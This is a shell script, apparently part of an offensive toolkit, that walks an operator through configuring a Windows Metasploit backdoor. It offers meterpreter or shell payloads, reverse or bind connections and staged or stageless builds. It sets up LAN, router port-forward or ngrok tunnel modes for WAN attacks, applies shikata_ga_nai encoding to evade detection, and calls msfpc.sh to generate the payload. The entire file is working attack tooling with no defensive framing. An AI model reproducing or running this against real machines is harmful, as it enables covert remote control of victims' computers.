#!/bin/sh
Work_directory=`pwd`
config_file="$Work_directory/../../../Modules/Metasploit/config"
## Color ##
#
red='\e[31m'
white="\e[97m" #normal
RESET="\033[00m" #normal
######
############
##Banner
##
echo ""
echo    $red "                __            "
echo    $red "               / _|           "
echo    $red " _ __ ___  ___| |_ ${RESET}_ __   ___ "
echo    $red '| "'"_ "'`'" _ \/ __|  _|${RESET} "'"_ \ / __|'
echo    $red "| | | | | \__ \ | ${RESET}| |_) | (__ "
echo    $red "|_| |_| |_|___/_| ${RESET}| .__/ \___|"
echo    $red "                  ${RESET}| |         "
echo    $red "                  ${RESET}|_|         "
sleep 0.5
##
##
############ 
MODE=`cat $config_file | egrep -m 1 "WorkMode" | cut -d '=' -f2` > /dev/null 2>&1	
echo  "[${red}*${RESET}] Set up backdoor configuration [${red}*${RESET}]"
sleep 0.5			
			CMD_MSF=$(zenity --list  --title "♛ Type Payload ♛" --text "\nChose option:" --radiolist --column "Pick" --column "Option" TRUE "meterpreter" FALSE "shell"  --width 300 --height 210 ) > /dev/null 2>&1
			BIND_REVERSE=$(zenity --list  --title "♛ Type Payload ♛" --text "\nChose option:" --radiolist --column "Pick" --column "Option" TRUE "reverse" FALSE "bind"  --width 300 --height 210 ) > /dev/null 2>&1
			STAGED_STAGELESS=$(zenity --list  --title "♛ Type Payload ♛" --text "\nChose option:" --radiolist --column "Pick" --column "Option" TRUE "staged" FALSE "stageless"  --width 300 --height 210 ) > /dev/null 2>&1

			if [ "$CMD_MSF" = "shell" ]; then
				CMD_MSF="CMD" 		
				cmd_meter="shell"
			else    CMD_MSF="MSF"		
				cmd_meter="meterpreter"
			fi
			if [ "$BIND_REVERSE" = "reverse" ]; then
				TCP_HTTP_HTTPS_FINDPORT=$(zenity --list  --title "♛ The method to connecting back. ♛" --text "\nChose option:" --radiolist --column "Pick" --column "Option" TRUE "TCP" FALSE "HTTP" FALSE "HTTPs" FALSE "FIND_PORT"  --width 300 --height 210 ) > /dev/null 2>&1
			elif [ "$BIND_REVERSE" = "bind" ]; then
				TCP_HTTP_HTTPS_FINDPORT=$(zenity --list  --title "♛ The method to connecting back. ♛" --text "\nChose option:" --radiolist --column "Pick" --column "Option" TRUE "TCP"  --width 300 --height 210 )  > /dev/null 2>&1
			fi
			if [ "$TCP_HTTP_HTTPS_FINDPORT" = "FIND_PORT" ]; then
				BiNd_ReVeRsE="reverse_tcp_allports"
			else
				if [ "$BIND_REVERSE" = "bind" ]; then
					BiNd_ReVeRsE="bind_tcp"
				elif [ "$BIND_REVERSE" = "reverse" ]; then
					BiNd_ReVeRsE="reverse_tcp"
				fi
			fi
echo " ${red}=>${RESET} Set up backdoor's value :${white}$STAGED_STAGELESS"_"$cmd_meter"_"$BIND_REVERSE"_"$TCP_HTTP_HTTPS_FINDPORT"
			#
			# WAN attacks using Ngrok Tunnel - Port Forward
			#
			    if [ "$MODE" = "3" ]; then
			    Local_port=$(zenity --title="☠ Enter Local Port ☠" --text "example: 4444" --entry --width 270 ) > /dev/null 2>&1
echo " ${red}=>${RESET} Set up backdoor's Local Port :${white}$Local_port"
			    xterm -fa monaco -fs 13 -bg black -e ngrok tcp $Local_port &
			    LhOsT=$(zenity --list --title "☠ Enter  HOST's  NGROK ☠" --text "\nChose option:" --radiolist --column "Pick" --column "Option" TRUE "0.tcp.ngrok.io" --width 300 --height 210 ) > /dev/null 2>&1  
echo " ${red}=>${RESET} Set up backdoor's HOST NGROK :${white}$LhOsT"
			    LpOrT=$(zenity --title="☠ Enter  LPORT's  NGROK ☠" --text "example: 1337" --entry --width 300 ) > /dev/null 2>&1
echo " ${red}=>${RESET} Set up backdoor's LPOR  NGROK :${white}$LpOrT"
			echo "LpOrT=$Local_port"	>> $config_file
			echo "PaYlOaD=windows/$cmd_meter/$BiNd_ReVeRsE" >> $config_file
			echo "Cert_SSL=false"	>> $config_file
			echo "VaL=false"	>> $config_file
			echo "StAgE=false"	>> $config_file
			echo "EnCoDe=x86/shikata_ga_nai" >> $config_file	
			#
			# WAN attacks on router
			#
			   elif [ "$MODE" = "2" ]; then
			   
			    LhOsT=$(zenity --title="☠ Enter  PUBLIC  IP ☠" --text "example: $WANIP " --entry --width 270 ) > /dev/null 2>&1
echo " ${red}=>${RESET} Set up backdoor's IP PUBLIC :${white}$LhOsT"
			    LpOrT=$(zenity --title="☠ Enter  Port Forwarding ☠" --text "example: 8080" --entry --width 270 ) > /dev/null 2>&1
echo " ${red}=>${RESET} Set up backdoor's Port Forwarding :${white}$LpOrT"
			    Local_host=$(zenity --title="☠ Enter your PRIVATE IP ☠" --text "example: $IP" --entry --width 270 ) > /dev/null 2>&1
echo " ${red}=>${RESET} Set up backdoor's IP PRIVATE :${white}$Local_host"
			    Local_port=$(zenity --title="☠ Enter  PORT  listening  ☠" --text "example: 4444" --entry --width 270 ) > /dev/null 2>&1
echo " ${red}=>${RESET} Set up backdoor's PORT listening :${white}$Local_port"
			echo "LhOsT=$Local_host"	>> $config_file
			echo "LpOrT=$Local_port"	>> $config_file
			echo "PaYlOaD=windows/$cmd_meter/$BiNd_ReVeRsE" >> $config_file
			echo "Cert_SSL=false"	>> $config_file
			echo "VaL=false"	>> $config_file
			echo "StAgE=false"	>> $config_file
			echo "EnCoDe=x86/shikata_ga_nai" >> $config_file	
			#
			# LAN attacks
			#
			   elif [ "$MODE" = "1" ]; then

			    LhOsT=$(zenity --title="☠ Enter  PRIVATE  IP ☠" --text "example: $IP " --entry --width 270 )  > /dev/null 2>&1 
echo " ${red}=>${RESET} Set up backdoor's IP PRIVATE :${white}$LhOsT"
			    LpOrT=$(zenity --title="☠ Enter  LPORT ☠" --text "example: 1337" --entry --width 270 ) > /dev/null 2>&1
echo " ${red}=>${RESET} Set up backdoor's PORT listening :${white}$LpOrT"
			echo "LhOsT=$LhOsT"	>> $config_file
			echo "LpOrT=$LpOrT"	>> $config_file
			echo "PaYlOaD=windows/$cmd_meter/$BiNd_ReVeRsE" >> $config_file
			echo "Cert_SSL=false"	>> $config_file
			echo "VaL=false"	>> $config_file
			echo "StAgE=false"	>> $config_file
			echo "EnCoDe=x86/shikata_ga_nai" >> $config_file	
			   fi
			sleep 0.5
			./msfpc.sh windows $LhOsT $LpOrT $CMD_MSF $BIND_REVERSE $STAGED_STAGELESS $TCP_HTTP_HTTPS_FINDPORT

